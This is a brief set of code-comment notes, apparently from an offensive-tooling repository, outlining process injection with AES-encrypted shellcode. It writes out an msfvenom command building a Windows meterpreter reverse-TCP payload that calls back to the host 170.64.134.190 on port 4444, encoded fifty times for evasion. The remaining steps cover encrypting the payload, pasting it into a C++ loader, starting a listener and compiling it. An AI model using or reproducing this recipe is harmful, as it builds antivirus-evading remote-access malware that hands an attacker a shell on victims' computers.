// Process Injection through AES Encrypted Shellcode 

// See attached files

//Create shellcode to inject

msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=170.64.134.190 lport=4444 -e x86/shikata_ga_nai -i 50 -f raw -o beacon.bin

//AES encrypt the shellcode


python3 aes_encryptor.py beacon.bin

//Paste outputted code into main.c++ 

//Start meterpreter listener

//Complile payload using dev c++
